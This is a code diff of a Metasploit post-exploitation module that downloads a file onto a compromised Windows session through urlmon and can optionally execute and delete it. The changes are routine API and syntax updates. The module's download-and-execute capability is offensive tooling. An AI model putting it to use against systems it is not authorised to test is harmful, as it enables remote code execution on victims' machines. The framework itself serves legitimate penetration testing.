@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
 
   def initialize(info={})
@@ -30,14 +26,14 @@ class MetasploitModule < Msf::Post
         OptString.new('FILENAME',      [false, 'Name for downloaded file' ]),
         OptBool.new(  'OUTPUT',        [true, 'Show execution output', true ]),
         OptBool.new(  'EXECUTE',       [true, 'Execute file after completion', false ]),
-      ], self.class)
+      ])
 
     register_advanced_options(
       [
         OptString.new('EXEC_STRING',   [false, 'Execution parameters when run from download directory' ]),
         OptInt.new(   'EXEC_TIMEOUT',  [true, 'Execution timeout', 60 ]),
         OptBool.new(  'DELETE',        [true, 'Delete file after execution', false ]),
-      ], self.class)
+      ])
 
   end
 
@@ -45,7 +41,7 @@ class MetasploitModule < Msf::Post
 
   def add_railgun_urlmon
 
-    if client.railgun.dlls.find_all {|d| d.first == 'urlmon'}.empty?
+    if client.railgun.libraries.find_all {|d| d.first == 'urlmon'}.empty?
       session.railgun.add_dll('urlmon','urlmon')
       session.railgun.add_function(
         'urlmon', 'URLDownloadToFileW', 'DWORD',
